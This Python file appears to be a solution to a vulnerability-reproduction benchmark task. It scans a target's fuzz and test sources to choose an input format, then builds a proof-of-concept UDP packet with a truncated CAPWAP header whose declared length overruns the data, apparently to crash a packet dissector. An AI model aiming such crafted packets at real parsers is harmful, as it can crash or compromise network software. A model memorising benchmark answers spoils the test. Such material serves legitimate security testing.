import os
import tarfile
from typing import Optional, Iterable, Tuple


def _inet_aton(ip: str) -> bytes:
    parts = ip.split(".")
    if len(parts) != 4:
        raise ValueError("invalid ip")
    b = bytearray(4)
    for i, p in enumerate(parts):
        v = int(p)
        if not (0 <= v <= 255):
            raise ValueError("invalid ip")
        b[i] = v
    return bytes(b)


def _csum16(data: bytes) -> int:
    if len(data) & 1:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
        s = (s & 0xFFFF) + (s >> 16)
    s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def _build_ipv4_udp_packet(payload: bytes, sport: int, dport: int,
                           src_ip: str = "1.2.3.4", dst_ip: str = "5.6.7.8",
                           ttl: int = 64) -> bytes:
    if not (0 <= sport <= 65535 and 0 <= dport <= 65535):
        raise ValueError("bad port")
    if not (0 <= ttl <= 255):
        raise ValueError("bad ttl")

    ihl = 5
    ver_ihl = (4 << 4) | ihl
    tos = 0
    total_len = 20 + 8 + len(payload)
    ident = 0
    flags_frag = 0
    proto = 17  # UDP
    src = _inet_aton(src_ip)
    dst = _inet_aton(dst_ip)

    ip_hdr_wo_csum = bytes([
        ver_ihl,
        tos,
        (total_len >> 8) & 0xFF, total_len & 0xFF,
        (ident >> 8) & 0xFF, ident & 0xFF,
        (flags_frag >> 8) & 0xFF, flags_frag & 0xFF,
        ttl,
        proto,
        0, 0,
    ]) + src + dst

    ip_csum = _csum16(ip_hdr_wo_csum)
    ip_hdr = ip_hdr_wo_csum[:10] + bytes([(ip_csum >> 8) & 0xFF, ip_csum & 0xFF]) + ip_hdr_wo_csum[12:]

    udp_len = 8 + len(payload)
    udp_hdr = bytes([
        (sport >> 8) & 0xFF, sport & 0xFF,
        (dport >> 8) & 0xFF, dport & 0xFF,
        (udp_len >> 8) & 0xFF, udp_len & 0xFF,
        0, 0  # checksum omitted (IPv4 allows 0)
    ])

    return ip_hdr + udp_hdr + payload


def _wrap_ethernet_ipv4(ip_packet: bytes) -> bytes:
    dst_mac = b"\x00\x11\x22\x33\x44\x55"
    src_mac = b"\x66\x77\x88\x99\xaa\xbb"
    ethertype_ipv4 = b"\x08\x00"
    return dst_mac + src_mac + ethertype_ipv4 + ip_packet


def _iter_source_files_from_dir(root: str) -> Iterable[Tuple[str, bytes]]:
    for base, _, files in os.walk(root):
        for fn in files:
            path = os.path.join(base, fn)
            rel = os.path.relpath(path, root).replace("\\", "/")
            try:
                st = os.stat(path)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > 2_000_000:
                continue
            if not any(rel.endswith(ext) for ext in (".c", ".h", ".cc", ".cpp", ".in", ".inc", ".m4", "Makefile", ".mk", ".am", ".ac", ".sh")):
                if "fuzz" not in rel and "oss" not in rel and "test" not in rel and "example" not in rel:
                    continue
            try:
                with open(path, "rb") as f:
                    data = f.read(2_000_000)
            except OSError:
                continue
            yield rel, data


def _iter_source_files_from_tar(tar_path: str) -> Iterable[Tuple[str, bytes]]:
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > 2_000_000:
                    continue
                rel = m.name.replace("\\", "/")
                if rel.startswith("./"):
                    rel = rel[2:]
                if not any(rel.endswith(ext) for ext in (".c", ".h", ".cc", ".cpp", ".in", ".inc", ".m4", "Makefile", ".mk", ".am", ".ac", ".sh")):
                    if "fuzz" not in rel and "oss" not in rel and "test" not in rel and "example" not in rel:
                        continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read(2_000_000)
                except Exception:
                    continue
                yield rel, data
    except Exception:
        return


def _guess_input_mode(src_path: str) -> str:
    """
    Returns:
      'raw_ip'  -> input begins with IPv4 header
      'ether'   -> input begins with ethernet header then IPv4
      'payload' -> input is UDP payload only
    """
    if os.path.isdir(src_path):
        it = _iter_source_files_from_dir(src_path)
    else:
        it = _iter_source_files_from_tar(src_path)

    score_raw = 0
    score_eth = 0
    score_payload = 0

    for rel, data in it:
        low_rel = rel.lower()
        focused = ("fuzz" in low_rel) or ("oss" in low_rel) or ("test" in low_rel) or ("example" in low_rel)
        if not focused and ("dl" not in low_rel and "pcap" not in low_rel):
            continue

        if b"DLT_RAW" in data or b"LINKTYPE_RAW" in data or b"DLT_IPV4" in data:
            score_raw += 5
        if b"DLT_EN10MB" in data or b"LINKTYPE_ETHERNET" in data:
            score_eth += 5

        if b"pcap_open_dead" in data and (b"DLT_RAW" in data or b"DLT_EN10MB" in data):
            if b"DLT_RAW" in data:
                score_raw += 3
            if b"DLT_EN10MB" in data:
                score_eth += 3

        if (b"payload_packet_len" in data and b"Data" in data and b"payload" in data and
                b"DLT_" not in data and b"pcap_open_dead" not in data and b"pcap_" not in data):
            score_payload += 2

        if score_raw >= 8:
            return "raw_ip"
        if score_eth >= 8:
            return "ether"

    if score_raw >= score_eth and score_raw > 0:
        return "raw_ip"
    if score_eth > 0:
        return "ether"
    if score_payload > 0:
        return "payload"
    return "raw_ip"


class Solution:
    def solve(self, src_path: str) -> bytes:
        mode = _guess_input_mode(src_path)

        # CAPWAP header crafted to look plausible while keeping payload short.
        # Version=0 (upper nibble), Type=0 (lower nibble)
        # HLEN=2 encoded in top 5 bits of byte1 => 0x10
        capwap_payload = b"\x00\x10\x00\x00\x00"  # 5 bytes

        if mode == "payload":
            return capwap_payload

        pkt = _build_ipv4_udp_packet(
            payload=capwap_payload,
            sport=5246,
            dport=5246,
            src_ip="1.2.3.4",
            dst_ip="5.6.7.8",
            ttl=64
        )

        if mode == "ether":
            return _wrap_ethernet_ipv4(pkt)

        return pkt